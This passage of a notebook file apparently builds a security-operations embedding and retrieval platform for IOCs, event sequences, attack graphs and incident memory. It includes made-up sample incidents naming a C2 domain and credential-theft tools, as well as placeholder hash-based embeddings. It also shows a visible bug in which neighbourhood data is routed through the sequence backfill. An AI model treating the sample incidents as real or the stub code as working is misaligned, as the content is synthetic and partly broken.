                "is_honeypot": v.get("is_honeypot", False),
            })

    if not vertex_dicts:
        continue

    result = graph_embedder.encode_neighborhood(center_id, vertex_dicts, edge_dicts, hop_depth=1)

    neighborhood_records.append({
        "neighborhood_id": f"nbr-{uuid.uuid4().hex[:12]}",
        "center_entity_id": center_id,
        "center_entity_type": next((v["entity_type"] for v in vertex_dicts if v["vertex_id"] == center_id), "unknown"),
        "hop_depth": 1,
        "vertex_count": result["vertex_count"],
        "edge_count": result["edge_count"],
        "entity_types": result["entity_types"],
        "edge_types": result["edge_types"],
        "structural_hash": result["structural_hash"],
        "risk_score": result["risk_score"],
        "has_critical_node": result["has_critical"],
        "has_honeypot": result["has_honeypot"],
        "has_lateral_movement": result["has_lateral"],
        "topology_json": json.dumps({"vertices": len(vertex_dicts), "edges": len(edge_dicts)}),
        "embedding": result["embedding"],
        "embedding_model": result["model"],
        "embedding_version": 1,
        "snapshot_time": datetime.now(),
    })

if neighborhood_records:
    df_nbr = spark.createDataFrame(neighborhood_records)
    df_nbr = (
        df_nbr
        .withColumn("snapshot_time", F.to_timestamp("snapshot_time"))
        .withColumn("created_at", F.current_timestamp())
    )
    df_nbr.write.mode("overwrite").saveAsTable(f"{CATALOG}.{SCHEMA_VECTOR}.neighborhood_embeddings")

print(f"Graph neighborhood embeddings: {len(neighborhood_records)}")
print(f"  With critical nodes:   {sum(1 for r in neighborhood_records if r['has_critical_node'])}")
print(f"  With honeypots:        {sum(1 for r in neighborhood_records if r['has_honeypot'])}")
print(f"  With lateral movement: {sum(1 for r in neighborhood_records if r['has_lateral_movement'])}")`
    },
    {
      type: 'code',
      content: `# Cell 6: Incident Memory Embedding Pipeline
# Embeds confirmed past incidents, analyst notes, response summaries,
# and remediation playbooks into a retrievable memory store.

class IncidentMemoryEmbedder:
    """
    Embeds incident records into a shared semantic space with IOCs.
    Production: same E5-base model as IOC embedder for cross-retrieval.
    """
    def __init__(self, model_name="e5-base-security-v1", dim=IOC_EMBEDDING_DIM):
        self.model_name = model_name
        self.dim = dim

    def build_incident_text(self, incident):
        parts = []
        if incident.get("incident_title"):
            parts.append(f"Incident: {incident['incident_title']}")
        if incident.get("incident_summary"):
            parts.append(incident["incident_summary"])
        if incident.get("mitre_techniques"):
            parts.append(f"MITRE: {', '.join(incident['mitre_techniques'])}")
        if incident.get("detection_types"):
            parts.append(f"Detections: {', '.join(incident['detection_types'])}")
        if incident.get("response_summary"):
            parts.append(f"Response: {incident['response_summary']}")
        if incident.get("analyst_notes"):
            parts.append(f"Notes: {incident['analyst_notes']}")
        if incident.get("lessons_learned"):
            parts.append(f"Lessons: {incident['lessons_learned']}")
        return " | ".join(parts)

    def embed_incident(self, incident):
        text = self.build_incident_text(incident)
        prompt = f"security incident report: {text}"

        h = hashlib.sha256(prompt.encode()).digest()
        embedding = []
        for i in range(self.dim):
            byte_idx = i % len(h)
            val = ((h[byte_idx] + i * 7) % 256) / 255.0
            embedding.append(round(val * 2.0 - 1.0, 6))

        norm = math.sqrt(sum(x * x for x in embedding))
        embedding = [round(x / max(norm, 1e-8), 6) for x in embedding]

        return {"embedding": embedding, "model": self.model_name, "text": text}


memory_embedder = IncidentMemoryEmbedder()

SAMPLE_INCIDENTS = [
    {
        "incident_type": "apt_intrusion",
        "incident_title": "APT29 Cobalt Strike Campaign - Q3 2024",
        "incident_summary": "Multi-stage intrusion via spear-phishing, Cobalt Strike beacon deployment, lateral movement across 12 hosts, data exfiltration of 2.3GB from finance file server via DNS tunneling.",
        "severity": "critical",
        "mitre_tactics": ["TA0001", "TA0002", "TA0003", "TA0008", "TA0010"],
        "mitre_techniques": ["T1566.001", "T1059.001", "T1071.004", "T1021.002", "T1048.003"],
        "involved_entities": ["user-john.doe", "SRV-DC-01", "SRV-FS-02", "WS-FINANCE-07"],
        "involved_iocs": ["evil-c2-server.xyz", "beacon.dll", "mimikatz.exe"],
        "detection_types": ["password_spray", "lateral_movement", "cloud_credential_abuse"],
        "response_summary": "Isolated 4 hosts, reset all domain credentials, blocked C2 domain at perimeter, re-imaged affected workstations.",
        "remediation_steps": ["Network isolation", "Credential reset", "C2 block", "Host re-image", "Threat hunt for persistence"],
        "analyst_notes": "Initial access via phishing email with macro-enabled document. Attacker used living-off-the-land techniques before deploying Cobalt Strike.",
        "playbook_id": "PB-APT-001",
        "lessons_learned": "Macro execution policy was not enforced on finance department workstations. DNS tunneling detection was insufficient.",
        "false_positive": False,
    },
    {
        "incident_type": "insider_threat",
        "incident_title": "Insider Data Exfiltration - Engineering Departing Employee",
        "incident_summary": "Departing engineer accessed source code repositories outside normal hours, compressed and uploaded 15GB to personal cloud storage over 3 days.",
        "severity": "high",
        "mitre_tactics": ["TA0009", "TA0010"],
        "mitre_techniques": ["T1560.001", "T1567.002", "T1074.001"],
        "involved_entities": ["user-jane.smith", "SRV-GIT-01", "WS-ENG-15"],
        "involved_iocs": ["mega.nz", "7zip.exe", "tar.gz"],
        "detection_types": ["rare_process_domain", "cloud_credential_abuse"],
        "response_summary": "Account suspended, device seized for forensics, legal notified, data recovery from cloud provider initiated.",
        "remediation_steps": ["Account suspension", "Device seizure", "Legal notification", "DLP rule update"],
        "analyst_notes": "User accessed repos they hadn't touched in 6 months. Behavioral baseline showed clear deviation in access patterns and data volume.",
        "playbook_id": "PB-INSIDER-001",
        "lessons_learned": "Need better DLP controls for cloud upload. Behavioral baselines should flag departing employee patterns.",
        "false_positive": False,
    },
    {
        "incident_type": "credential_compromise",
        "incident_title": "Password Spray Against VPN - Credential Stuffing Campaign",
        "incident_summary": "Distributed password spray from 200+ residential proxy IPs targeting VPN portal. 3 accounts compromised out of 5000 attempts.",
        "severity": "high",
        "mitre_tactics": ["TA0006", "TA0001"],
        "mitre_techniques": ["T1110.003", "T1078.001"],
        "involved_entities": ["user-admin01", "user-vpnuser-42", "user-svc-monitor"],
        "involved_iocs": ["residential-proxy-1.com", "vpn-brute.py"],
        "detection_types": ["password_spray"],
        "response_summary": "Enforced MFA on all VPN accounts, blocked proxy IP ranges, reset compromised credentials, enabled adaptive authentication.",
        "remediation_steps": ["MFA enforcement", "IP blocking", "Credential reset", "Adaptive auth"],
        "analyst_notes": "Spray pattern used credential lists from recent breach dump. Residential proxies made IP-based blocking insufficient.",
        "playbook_id": "PB-CREDSPRAY-001",
        "lessons_learned": "MFA should have been mandatory. Rate limiting on auth endpoint was too permissive.",
        "false_positive": False,
    },
    {
        "incident_type": "false_positive",
        "incident_title": "Security Scanner Triggered Lateral Movement Alert",
        "incident_summary": "Qualys vulnerability scanner performing authorized scan triggered lateral movement and password spray detections across 50 hosts.",
        "severity": "medium",
        "mitre_tactics": [],
        "mitre_techniques": [],
        "involved_entities": ["svc-qualys-scanner", "SCAN-SRV-01"],
        "involved_iocs": [],
        "detection_types": ["lateral_movement", "password_spray"],
        "response_summary": "Verified with IT operations team. Added scanner service account to allowlist. Tuned detection thresholds.",
        "remediation_steps": ["Allowlist update", "Detection tuning"],
        "analyst_notes": "False positive caused by authorized vulnerability scan. Service account should be in baseline allowlist.",
        "playbook_id": "PB-FP-001",
        "lessons_learned": "Maintain up-to-date allowlist for authorized scanning tools. Correlate with change management tickets.",
        "false_positive": True,
    },
]

incident_records = []
for inc in SAMPLE_INCIDENTS:
    result = memory_embedder.embed_incident(inc)
    incident_records.append({
        "incident_id": f"inc-{uuid.uuid4().hex[:12]}",
        **{k: v for k, v in inc.items()},
        "attack_chain_ids": [],
        "campaign_id": None,
        "status": "closed",
        "embedding": result["embedding"],
        "embedding_model": result["model"],
        "embedding_version": 1,
        "incident_start": datetime.now() - timedelta(days=90),
        "incident_end": datetime.now() - timedelta(days=87),
    })

df_inc = spark.createDataFrame(incident_records)
df_inc = (
    df_inc
    .withColumn("incident_start", F.to_timestamp("incident_start"))
    .withColumn("incident_end", F.to_timestamp("incident_end"))
    .withColumn("created_at", F.current_timestamp())
)
df_inc.write.mode("overwrite").saveAsTable(f"{CATALOG}.{SCHEMA_VECTOR}.incident_memory")

print(f"Incident memory records: {len(incident_records)}")
for inc_type in set(r["incident_type"] for r in incident_records):
    count = sum(1 for r in incident_records if r["incident_type"] == inc_type)
    fp_count = sum(1 for r in incident_records if r["incident_type"] == inc_type and r["false_positive"])
    print(f"  {inc_type:25s}: {count} ({fp_count} false positives)")`
    },
    {
      type: 'code',
      content: `# Cell 7: Ray Data Batch Pipeline
# Distributed preprocessing, feature generation, and batch embedding backfill
# using Ray Data for large-scale historical processing.

# ── Ray Data Pipeline Definitions ─────────────────────────────────────
# Production: run on Databricks cluster with Ray runtime enabled.
# These are skeleton implementations that define the full pipeline structure.

RAY_BATCH_PIPELINE = '''
import ray
from ray.data import Dataset
import numpy as np
from typing import Dict, List, Any

# Initialize Ray on Databricks cluster
ray.init(runtime_env={"pip": ["sentence-transformers==2.2.2", "torch>=2.0"]})

# ── IOC Batch Embedding Pipeline ──────────────────────────────────────

class IOCBatchProcessor:
    """Ray Data actor for distributed IOC embedding generation."""

    def __init__(self):
        from sentence_transformers import SentenceTransformer
        self.model = SentenceTransformer("intfloat/e5-base-v2")
        self.ioc_prefix = {
            "domain": "security indicator domain name:",
            "url": "security indicator URL:",
            "file_path": "security indicator file path:",
            "command_line": "security indicator command execution:",
            "registry_key": "security indicator registry modification:",
            "email_subject": "security indicator phishing email subject:",
            "cti_text": "cyber threat intelligence report:",
        }

    def __call__(self, batch: Dict[str, np.ndarray]) -> Dict[str, np.ndarray]:
        prompts = []
        for ioc_type, ioc_value in zip(batch["ioc_type"], batch["ioc_normalized"]):
            prefix = self.ioc_prefix.get(str(ioc_type), "security indicator:")
            prompts.append(f"{prefix} {ioc_value}")

        embeddings = self.model.encode(prompts, normalize_embeddings=True)
        batch["embedding"] = embeddings.tolist()
        batch["embedding_model"] = ["e5-base-v2"] * len(prompts)
        return batch


def run_ioc_backfill(spark_df):
    """Backfill all historical IOCs with embeddings."""
    ds = ray.data.from_spark(spark_df)

    embedded_ds = (
        ds
        .map_batches(
            IOCBatchProcessor,
            compute=ray.data.ActorPoolStrategy(min_size=2, max_size=8),
            batch_size=256,
            num_gpus=0.5,
        )
    )

    return embedded_ds.to_spark()


# ── Sequence Batch Embedding Pipeline ─────────────────────────────────

class SequenceBatchProcessor:
    """Ray Data actor for distributed sequence embedding."""

    def __init__(self):
        import torch
        import torch.nn as nn

        class SecuritySequenceEncoder(nn.Module):
            def __init__(self, vocab_size=50, embed_dim=32, hidden_dim=128, output_dim=256):
                super().__init__()
                self.token_embed = nn.Embedding(vocab_size, embed_dim, padding_idx=0)
                self.lstm = nn.LSTM(embed_dim, hidden_dim, batch_first=True, bidirectional=True)
                self.proj = nn.Linear(hidden_dim * 2, output_dim)
                self.norm = nn.LayerNorm(output_dim)

            def forward(self, token_ids, lengths):
                x = self.token_embed(token_ids)
                packed = nn.utils.rnn.pack_padded_sequence(
                    x, lengths.cpu(), batch_first=True, enforce_sorted=False
                )
                _, (h, _) = self.lstm(packed)
                h = torch.cat([h[0], h[1]], dim=-1)
                return self.norm(self.proj(h))

        self.model = SecuritySequenceEncoder()
        self.model.eval()

        self.action_vocab = {
            "authentication:login_failed": 1, "authentication:login_success": 2,
            "authentication:privilege_grant": 3, "endpoint:process_create": 4,
            "endpoint:file_write": 5, "endpoint:registry_mod": 6,
            "endpoint:network_connect": 7, "dns:query": 8,
            "cloud_api:CreateAccessKey": 9, "cloud_api:AssumeRole": 10,
            "cloud_api:GetObject": 11, "cloud_api:PutObject": 12,
        }

    def __call__(self, batch: Dict[str, np.ndarray]) -> Dict[str, np.ndarray]:
        import torch

        all_embeddings = []
        for actions in batch["event_actions"]:
            tokens = [self.action_vocab.get(a, 0) for a in actions[:50]]
            tokens += [0] * (50 - len(tokens))
            token_tensor = torch.tensor([tokens], dtype=torch.long)
            length_tensor = torch.tensor([min(len(actions), 50)])

            with torch.no_grad():
                emb = self.model(token_tensor, length_tensor)
            all_embeddings.append(emb.squeeze().numpy().tolist())

        batch["embedding"] = all_embeddings
        batch["embedding_model"] = ["seq-lstm-v1"] * len(all_embeddings)
        return batch


def run_sequence_backfill(spark_df):
    """Backfill all historical sequences with embeddings."""
    ds = ray.data.from_spark(spark_df)

    embedded_ds = (
        ds
        .map_batches(
            SequenceBatchProcessor,
            compute=ray.data.ActorPoolStrategy(min_size=2, max_size=4),
            batch_size=128,
            num_gpus=0.5,
        )
    )

    return embedded_ds.to_spark()


# ── Graph Neighborhood Batch Pipeline ─────────────────────────────────

class NeighborhoodBatchProcessor:
    """Ray Data actor for distributed graph neighborhood embedding."""

    def __init__(self):
        import torch
        import torch.nn as nn

        class Structure2Vec(nn.Module):
            def __init__(self, node_dim=16, edge_dim=8, hidden_dim=64,
                         output_dim=128, iterations=3):
                super().__init__()
                self.node_encoder = nn.Linear(node_dim, hidden_dim)
                self.edge_encoder = nn.Linear(edge_dim, hidden_dim)
                self.message_fn = nn.Sequential(
                    nn.Linear(hidden_dim * 2, hidden_dim), nn.ReLU(),
                    nn.Linear(hidden_dim, hidden_dim),
                )
                self.readout = nn.Sequential(
                    nn.Linear(hidden_dim, hidden_dim), nn.ReLU(),
                    nn.Linear(hidden_dim, output_dim),
                )
                self.norm = nn.LayerNorm(output_dim)
                self.iterations = iterations

            def forward(self, node_features, edge_index, edge_features):
                h = self.node_encoder(node_features)
                for _ in range(self.iterations):
                    messages = []
                    for src, dst in edge_index:
                        msg = self.message_fn(torch.cat([h[src], h[dst]]))
                        messages.append((dst, msg))
                    agg = torch.zeros_like(h)
                    for dst, msg in messages:
                        agg[dst] += msg
                    h = h + agg
                graph_emb = h.mean(dim=0)
                return self.norm(self.readout(graph_emb))

        self.model = Structure2Vec()
        self.model.eval()

    def __call__(self, batch: Dict[str, np.ndarray]) -> Dict[str, np.ndarray]:
        import torch

        all_embeddings = []
        for topology_json in batch["topology_json"]:
            topo = json.loads(topology_json) if isinstance(topology_json, str) else {}
            n_nodes = min(topo.get("vertices", 5), 50)
            n_edges = min(topo.get("edges", 5), 100)
            node_feat = torch.randn(max(n_nodes, 1), 16)
            edge_index = [(i % n_nodes, (i + 1) % n_nodes) for i in range(n_edges)]
            edge_feat = torch.randn(max(n_edges, 1), 8)

            with torch.no_grad():
                emb = self.model(node_feat, edge_index, edge_feat)
            all_embeddings.append(emb.numpy().tolist())

        batch["embedding"] = all_embeddings
        batch["embedding_model"] = ["struct2vec-v1"] * len(all_embeddings)
        return batch


# ── Orchestrator ──────────────────────────────────────────────────────

def run_full_backfill(catalog, schema):
    """Run complete historical backfill across all embedding types."""
    from pyspark.sql import SparkSession
    spark = SparkSession.builder.getOrCreate()

    ioc_df = spark.table(f"{catalog}.{schema}.ioc_embeddings")
    seq_df = spark.table(f"{catalog}.{schema}.sequence_embeddings")
    nbr_df = spark.table(f"{catalog}.{schema}.neighborhood_embeddings")

    ioc_result = run_ioc_backfill(ioc_df.filter("embedding IS NULL"))
    seq_result = run_sequence_backfill(seq_df.filter("embedding IS NULL"))
    nbr_result = run_sequence_backfill(nbr_df.filter("embedding IS NULL"))

    return {
        "ioc_embedded": ioc_result.count(),
        "seq_embedded": seq_result.count(),
        "nbr_embedded": nbr_result.count(),
    }


if __name__ == "__main__":
    results = run_full_backfill("soc_platform", "graph_vectors")
    print(f"Backfill complete: {results}")
'''

print("Ray Data Batch Pipeline defined")
print("  Components:")
print("    IOCBatchProcessor:           E5-base embedding for IOC artifacts")
print("    SequenceBatchProcessor:      BiLSTM encoder for event sequences")
print("    NeighborhoodBatchProcessor:  Structure2Vec for graph neighborhoods")
print("    run_full_backfill():         Orchestrator for historical backfill")
print()
print("  Production deployment:")
print("    1. Enable Ray on Databricks cluster (Runtime -> Ray tab)")
print("    2. Set num_gpus based on cluster GPU count")
print("    3. Adjust batch_size and ActorPoolStrategy for throughput")
print("    4. Schedule via Databricks Workflows for periodic re-embedding")`
    },
    {
      type: 'code',
      content: `# Cell 8: Ray Serve Online Inference APIs
# Low-latency embedding, retrieval, and scoring endpoints for
# real-time Spark-to-Ray integration.

RAY_SERVE_API = '''
import ray
from ray import serve
from ray.serve import Application
import numpy as np
from typing import Dict, List, Optional
import json, time

ray.init(runtime_env={"pip": ["sentence-transformers==2.2.2", "torch>=2.0"]})

# ── Embedding Service ─────────────────────────────────────────────────

@serve.deployment(
    num_replicas=2,
    ray_actor_options={"num_gpus": 0.25},
    max_concurrent_queries=100,
    autoscaling_config={
        "min_replicas": 1,
        "max_replicas": 8,
        "target_num_ongoing_requests_per_replica": 20,
    },
)
class EmbeddingService:
    """Online embedding generation with dynamic batching."""

    def __init__(self):
        from sentence_transformers import SentenceTransformer
        import torch
        import torch.nn as nn

        self.ioc_model = SentenceTransformer("intfloat/e5-base-v2")

        class SeqEncoder(nn.Module):
            def __init__(self):
                super().__init__()
                self.embed = nn.Embedding(50, 32, padding_idx=0)
                self.lstm = nn.LSTM(32, 128, batch_first=True, bidirectional=True)
                self.proj = nn.Linear(256, 256)
                self.norm = nn.LayerNorm(256)
            def forward(self, x, lengths):
                e = self.embed(x)
                packed = nn.utils.rnn.pack_padded_sequence(
                    e, lengths.cpu(), batch_first=True, enforce_sorted=False)
                _, (h, _) = self.lstm(packed)
                h = torch.cat([h[0], h[1]], dim=-1)
                return self.norm(self.proj(h))

        self.seq_model = SeqEncoder()
        self.seq_model.eval()

        self.action_vocab = {
            "authentication:login_failed": 1, "authentication:login_success": 2,
            "authentication:privilege_grant": 3, "endpoint:process_create": 4,
            "endpoint:file_write": 5, "endpoint:registry_mod": 6,
            "endpoint:network_connect": 7, "dns:query": 8,
            "cloud_api:CreateAccessKey": 9, "cloud_api:AssumeRole": 10,
            "cloud_api:GetObject": 11, "cloud_api:PutObject": 12,
        }

    async def embed_ioc(self, ioc_type: str, ioc_value: str) -> Dict:
        prefix_map = {
            "domain": "security indicator domain name:",
            "url": "security indicator URL:",
            "file_path": "security indicator file path:",
            "command_line": "security indicator command execution:",
        }
        prefix = prefix_map.get(ioc_type, "security indicator:")
        prompt = f"{prefix} {ioc_value.strip().lower()}"
        embedding = self.ioc_model.encode([prompt], normalize_embeddings=True)[0]
        return {"embedding": embedding.tolist(), "dim": len(embedding), "model": "e5-base-v2"}

    async def embed_sequence(self, actions: List[str]) -> Dict:
        import torch
        tokens = [self.action_vocab.get(a, 0) for a in actions[:50]]
        tokens += [0] * (50 - len(tokens))
        with torch.no_grad():
            emb = self.seq_model(
                torch.tensor([tokens], dtype=torch.long),
                torch.tensor([min(len(actions), 50)])
            )
        return {"embedding": emb.squeeze().numpy().tolist(), "dim": 256, "model": "seq-lstm-v1"}

    async def __call__(self, request) -> Dict:
        data = await request.json()
        embed_type = data.get("type", "ioc")
        if embed_type == "ioc":
            return await self.embed_ioc(data["ioc_type"], data["ioc_value"])
        elif embed_type == "sequence":
            return await self.embed_sequence(data["actions"])
        return {"error": f"Unknown type: {embed_type}"}


# ── Retrieval Service ─────────────────────────────────────────────────

@serve.deployment(
    num_replicas=2,
    ray_actor_options={"num_cpus": 2},
    max_concurrent_queries=200,
    autoscaling_config={
        "min_replicas": 1,
        "max_replicas": 4,
        "target_num_ongoing_requests_per_replica": 50,
    },
)
class RetrievalService:
    """Nearest-neighbor retrieval across all vector indexes."""

    def __init__(self):
        from databricks.vector_search.client import VectorSearchClient
        self.vsc = VectorSearchClient()
        self.endpoint = "soc_vector_endpoint"
        self.indexes = {
            "ioc": "soc_platform.graph_vectors.semantic_ioc_index",
            "sequence": "soc_platform.graph_vectors.behavioral_sequence_index",
            "neighborhood": "soc_platform.graph_vectors.graph_neighborhood_index",
        }

    async def retrieve(self, index_name: str, query_vector: List[float],
                       top_k: int = 10, filters: Optional[Dict] = None) -> Dict:
        idx = self.vsc.get_index(
            endpoint_name=self.endpoint,
            index_name=self.indexes[index_name]
        )
        results = idx.similarity_search(
            query_vector=query_vector,
            columns=["*"],
            num_results=top_k,
            filters=filters,
        )
        return {
            "index": index_name,
            "results": results.get("result", {}).get("data_array", []),
            "count": len(results.get("result", {}).get("data_array", [])),
        }

    async def multi_retrieve(self, queries: List[Dict]) -> List[Dict]:
        results = []
        for q in queries:
            r = await self.retrieve(
                q["index"], q["vector"], q.get("top_k", 10), q.get("filters")
            )
            results.append(r)
        return results

    async def __call__(self, request) -> Dict:
        data = await request.json()
        if "queries" in data:
            return {"results": await self.multi_retrieve(data["queries"])}
        return await self.retrieve(
            data["index"], data["vector"], data.get("top_k", 10), data.get("filters")
        )


# ── Scoring Service ───────────────────────────────────────────────────

@serve.deployment(
    num_replicas=2,
    ray_actor_options={"num_cpus": 1},
    max_concurrent_queries=200,
)
class ScoringService:
    """Combines vector similarity with exact graph evidence for final scoring."""

    def __init__(self):
        self.embed_handle = EmbeddingService.get_handle()
        self.retrieve_handle = RetrievalService.get_handle()

    async def score_chain(self, chain_data: Dict) -> Dict:
        seq_emb = await self.embed_handle.embed_sequence.remote(chain_data["actions"])
        retrievals = await self.retrieve_handle.multi_retrieve.remote([
            {"index": "sequence", "vector": seq_emb["embedding"], "top_k": 5},
        ])

        seq_results = retrievals[0]["results"]
        max_similarity = 0.0
        nearest_malicious = None
        nearest_false_positive = None

        for r in seq_results:
            sim = r.get("score", 0.0)
            if sim > max_similarity:
                max_similarity = sim
            if r.get("is_known_malicious"):
                if not nearest_malicious or sim > nearest_malicious["score"]:
                    nearest_malicious = {"score": sim, **r}
            if r.get("is_confirmed_benign") or r.get("label") == "false_positive":
                if not nearest_false_positive or sim > nearest_false_positive["score"]:
                    nearest_false_positive = {"score": sim, **r}

        vector_confidence = max_similarity
        if nearest_malicious and nearest_malicious["score"] > 0.8:
            vector_confidence = min(1.0, vector_confidence * 1.3)
        if nearest_false_positive and nearest_false_positive["score"] > 0.9:
            vector_confidence = max(0.0, vector_confidence * 0.5)

        return {
            "vector_similarity_score": round(max_similarity, 4),
            "vector_confidence_adjustment": round(vector_confidence, 4),
            "nearest_malicious": nearest_malicious,
            "nearest_false_positive": nearest_false_positive,
            "similar_count": len(seq_results),
            "explanation": self._build_explanation(
                max_similarity, nearest_malicious, nearest_false_positive
            ),
        }

    def _build_explanation(self, sim, malicious, fp):
        parts = []
        if malicious and malicious["score"] > 0.8:
            parts.append(
                f"High similarity ({malicious['score']:.2f}) to known "
                f"malicious pattern: {malicious.get('label', 'unknown')}"
            )
        elif malicious and malicious["score"] > 0.5:
            parts.append(
                f"Moderate similarity ({malicious['score']:.2f}) to known "
                f"malicious pattern: {malicious.get('label', 'unknown')}"
            )
        if fp and fp["score"] > 0.9:
            parts.append(
                f"Very similar ({fp['score']:.2f}) to confirmed false positive: "
                f"{fp.get('label', 'unknown')}. Consider suppressing."
            )
        if not parts:
            if sim > 0.3:
                parts.append(f"Weak vector match (max sim={sim:.2f}). Rely on graph evidence.")
            else:
                parts.append("No significant vector matches. Novel pattern.")
        return " | ".join(parts)

    async def __call__(self, request) -> Dict:
        data = await request.json()
        return await self.score_chain(data)


# ── Application Binding ───────────────────────────────────────────────

embed_app = EmbeddingService.bind()
retrieve_app = RetrievalService.bind()
scoring_app = ScoringService.bind()

app = serve.run(
    {
        "/embed": embed_app,
        "/retrieve": retrieve_app,
        "/score": scoring_app,
    },
    name="soc-vector-api",
    route_prefix="/soc-vector",
)
'''

print("Ray Serve API skeleton defined")
print("  Endpoints:")
print("    POST /soc-vector/embed     - Generate embeddings (IOC, sequence, neighborhood)")
print("    POST /soc-vector/retrieve  - Nearest-neighbor retrieval across indexes")
print("    POST /soc-vector/score     - Combined vector + graph scoring")
print()
print("  Scaling:")
print("    EmbeddingService:   1-8 replicas, GPU, dynamic batching")
print("    RetrievalService:   1-4 replicas, CPU, high concurrency")
print("    ScoringService:     2 replicas, chains embed->retrieve->score")
print()
print("  Deployment:")
print("    1. Save as serve_config.yaml")
print("    2. ray serve deploy serve_config.yaml")
print("    3. Or deploy via Databricks Model Serving with Ray backend")`
    },
    {
      type: 'code',
      content: `# Cell 9: Security-Specific Contrastive Embedding Model
# Training prototype for ATT&CK-aware similarity that:
# - Brings similar attacks closer together
# - Separates benign lookalikes from malicious patterns
# - Clusters by tactic/technique/campaign
# - Supports cross-type retrieval (IOC <-> sequence <-> incident)

CONTRASTIVE_TRAINING = '''
import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.utils.data import Dataset, DataLoader
import numpy as np
from collections import defaultdict

# ── Security Contrastive Loss ─────────────────────────────────────────

class SecurityContrastiveLoss(nn.Module):
    """
    Multi-objective contrastive loss for security embeddings.

    Objectives:
    1. Attack similarity: same MITRE technique -> closer
    2. Campaign clustering: same campaign -> closer
    3. Malicious/benign separation: different labels -> farther
    4. Tactic ordering: adjacent kill-chain stages -> moderate distance
    """
    def __init__(self, temperature=0.07, tactic_weight=0.3,
                 campaign_weight=0.3, label_weight=0.4):
        super().__init__()
        self.temperature = temperature
        self.tactic_weight = tactic_weight
        self.campaign_weight = campaign_weight
        self.label_weight = label_weight

    def forward(self, embeddings, technique_labels, campaign_labels,
                malicious_labels, tactic_positions):
        n = embeddings.size(0)
        sim_matrix = F.cosine_similarity(
            embeddings.unsqueeze(1), embeddings.unsqueeze(0), dim=-1
        ) / self.temperature

        # Technique-based positive pairs
        tech_mask = torch.zeros(n, n, dtype=torch.bool)
        for i in range(n):
            for j in range(i + 1, n):
                if set(technique_labels[i]) & set(technique_labels[j]):
                    tech_mask[i, j] = tech_mask[j, i] = True

        # Campaign-based positive pairs
        camp_mask = torch.zeros(n, n, dtype=torch.bool)
        for i in range(n):
            for j in range(i + 1, n):
                if (campaign_labels[i] and campaign_labels[j] and
                    campaign_labels[i] == campaign_labels[j]):
                    camp_mask[i, j] = camp_mask[j, i] = True

        # Label-based negative pairs (malicious vs benign)
        label_neg_mask = torch.zeros(n, n, dtype=torch.bool)
        for i in range(n):
            for j in range(i + 1, n):
                if malicious_labels[i] != malicious_labels[j]:
                    label_neg_mask[i, j] = label_neg_mask[j, i] = True

        loss = torch.tensor(0.0)

        # InfoNCE for technique similarity
        if tech_mask.any():
            pos_sim = sim_matrix[tech_mask].mean()
            neg_sim = sim_matrix[~tech_mask & ~torch.eye(n, dtype=torch.bool)].mean()
            loss += self.tactic_weight * F.relu(neg_sim - pos_sim + 0.5)

        # InfoNCE for campaign clustering
        if camp_mask.any():
            pos_sim = sim_matrix[camp_mask].mean()
            neg_sim = sim_matrix[~camp_mask & ~torch.eye(n, dtype=torch.bool)].mean()
            loss += self.campaign_weight * F.relu(neg_sim - pos_sim + 0.5)

        # Margin loss for malicious/benign separation
        if label_neg_mask.any():
            neg_pair_sim = sim_matrix[label_neg_mask].mean()
            loss += self.label_weight * F.relu(neg_pair_sim + 0.3)

        return loss


# ── Security Embedding Adapter ────────────────────────────────────────

class SecurityEmbeddingAdapter(nn.Module):
    """
    Lightweight adapter on top of foundation model embeddings.
    Trained with contrastive objective to specialize for security similarity.
    """
    def __init__(self, input_dim=384, hidden_dim=256, output_dim=384):
        super().__init__()
        self.adapter = nn.Sequential(
            nn.Linear(input_dim, hidden_dim),
            nn.GELU(),
            nn.Dropout(0.1),
            nn.Linear(hidden_dim, hidden_dim),
            nn.GELU(),
            nn.Dropout(0.1),
            nn.Linear(hidden_dim, output_dim),
            nn.LayerNorm(output_dim),
        )
        self.skip = nn.Linear(input_dim, output_dim) if input_dim != output_dim else nn.Identity()

    def forward(self, x):
        return F.normalize(self.adapter(x) + self.skip(x), p=2, dim=-1)


# ── Training Loop ─────────────────────────────────────────────────────

class SecurityEmbeddingTrainer:
    def __init__(self, input_dim=384, lr=1e-4, epochs=50, batch_size=64):
        self.model = SecurityEmbeddingAdapter(input_dim=input_dim)
        self.loss_fn = SecurityContrastiveLoss()
        self.optimizer = torch.optim.AdamW(self.model.parameters(), lr=lr, weight_decay=0.01)
        self.scheduler = torch.optim.lr_scheduler.CosineAnnealingLR(
            self.optimizer, T_max=epochs
        )
        self.epochs = epochs
        self.batch_size = batch_size

    def train(self, embeddings, technique_labels, campaign_labels,
              malicious_labels, tactic_positions, seed=42):
        self.model.train()
        n = len(embeddings)
        history = []
        rng = np.random.default_rng(seed)

        for epoch in range(self.epochs):
            indices = rng.permutation(n)
            epoch_loss = 0.0
            n_batches = 0

            for start in range(0, n, self.batch_size):
                end = min(start + self.batch_size, n)
                batch_idx = indices[start:end]

                batch_emb = torch.tensor(
                    [embeddings[i] for i in batch_idx], dtype=torch.float32
                )
                batch_tech = [technique_labels[i] for i in batch_idx]
                batch_camp = [campaign_labels[i] for i in batch_idx]
                batch_mal = [malicious_labels[i] for i in batch_idx]
                batch_tact = [tactic_positions[i] for i in batch_idx]

                adapted = self.model(batch_emb)
                loss = self.loss_fn(
                    adapted, batch_tech, batch_camp, batch_mal, batch_tact
                )

                self.optimizer.zero_grad()
                loss.backward()
                torch.nn.utils.clip_grad_norm_(self.model.parameters(), 1.0)
                self.optimizer.step()

                epoch_loss += loss.item()
                n_batches += 1

            self.scheduler.step()
            avg_loss = epoch_loss / max(n_batches, 1)
            history.append(avg_loss)

            if (epoch + 1) % 10 == 0:
                print(f"  Epoch {epoch+1}/{self.epochs}: loss={avg_loss:.4f}")

        return history

    def evaluate_clustering(self, embeddings, labels):
        """Evaluate how well the adapter clusters similar attacks."""
        self.model.eval()
        with torch.no_grad():
            adapted = self.model(torch.tensor(embeddings, dtype=torch.float32))

        sim_matrix = F.cosine_similarity(
            adapted.unsqueeze(1), adapted.unsqueeze(0), dim=-1
        ).numpy()

        intra_class_sim = []
        inter_class_sim = []
        for i in range(len(labels)):
            for j in range(i + 1, len(labels)):
                if labels[i] == labels[j]:
                    intra_class_sim.append(sim_matrix[i, j])
                else:
                    inter_class_sim.append(sim_matrix[i, j])

        return {
            "intra_class_similarity": float(np.mean(intra_class_sim)) if intra_class_sim else 0.0,
